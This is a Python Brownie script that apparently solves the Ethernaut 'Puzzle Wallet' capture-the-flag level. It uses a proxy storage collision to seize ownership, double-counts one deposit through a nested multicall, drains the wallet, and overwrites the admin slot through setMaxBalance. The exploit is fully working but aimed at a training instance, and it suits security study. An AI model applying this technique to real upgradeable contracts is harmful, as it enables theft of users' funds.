
from brownie import (
    network,
    accounts,
    config,
    interface,
    Contract,
)
from scripts.helpful_scripts import (
    get_account,
    get_new_instance,
    submit_instance,
)
from web3 import Web3


def main():
    player = get_account()
    instance_address = get_new_instance(level_id=24, player=player, value=Web3.toWei(0.001, "ether"))

    wallet_contract = interface.IPuzzleWallet(instance_address)

    print_state(wallet_contract, player)

    tx = wallet_contract.proposeNewAdmin(player, {"from": player})
    tx.wait(1)

    print_state(wallet_contract, player)

    tx = wallet_contract.addToWhitelist(player, {"from": player})
    tx.wait(1)

    deposit_tx_data = wallet_contract.deposit.encode_input()
    multicall_tx_data = wallet_contract.multicall.encode_input([deposit_tx_data])
    tx = wallet_contract.multicall([deposit_tx_data, multicall_tx_data], {"from": player, "value": Web3.toWei(0.001, "ether")})
    tx.wait(1)

    print_state(wallet_contract, player)

    tx = wallet_contract.execute(player, Web3.toWei(0.002, "ether"), b'', {"from": player})
    tx.wait(1)

    print_state(wallet_contract, player)

    tx = wallet_contract.setMaxBalance(Web3.toBytes(hexstr=str(player)), {"from": player})
    tx.wait(1)

    print_state(wallet_contract, player)

    submit_instance(instance_address, player)

def print_state(wallet_contract, player):
    print(f'Admin: {wallet_contract.admin()}')
    print(f'Owner: {wallet_contract.owner()}')
    print(f'Pending Admin: {wallet_contract.pendingAdmin()}')
    print(f'Max balance: {Web3.toHex(wallet_contract.maxBalance())}')
    print(f'Contract balance: {Web3.fromWei(wallet_contract.balance(), "ether")}')
    print(f'Player balance: {Web3.fromWei(wallet_contract.balances(player), "ether")}')
    print()